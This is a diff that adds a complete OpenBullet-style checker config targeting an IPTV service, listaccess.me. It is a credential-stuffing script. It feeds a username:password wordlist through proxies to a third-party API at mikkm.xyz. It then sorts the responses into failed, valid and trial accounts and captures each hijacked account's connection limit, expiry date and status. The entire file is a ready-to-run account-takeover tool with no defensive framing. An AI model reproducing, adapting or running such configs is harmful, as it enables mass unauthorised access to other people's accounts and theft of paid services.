@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "listaccess.me",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-07T23:45:57.3737515+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Kadamouri",
+  "Version": "1.2.1.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#URL REQUEST GET "http://mikkm.xyz/android/androidApi.php?mode=user_info&url=http://listaccess.me:8880/&username=<USER>&password=<PASS>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Plex-Client-Identifier: 9f6e14d4-27c8-f593-77d7-18bb8db6257a" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"auth\":0" 
+    KEY "ACCESS DENIED! AndroidAPI v3.1" 
+  KEYCHAIN Success OR 
+    KEY "status\":" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\",\"is_trial\":\"1" 
+
+#CONNECTIONS PARSE "<SOURCE>" LR "\"max_connections\":\"" "\"" -> CAP "CONNECTIONS" 
+
+#EXPIRE PARSE "<SOURCE>" LR "\",\"exp_date\":\"" "\"" -> VAR "EXPIRE" 
+
+FUNCTION UnixTimeToDate "<EXPIRE>" -> CAP "EXPIRE" 
+
+#status PARSE "<SOURCE>" LR "status\":\"" "\"" -> CAP "status" 
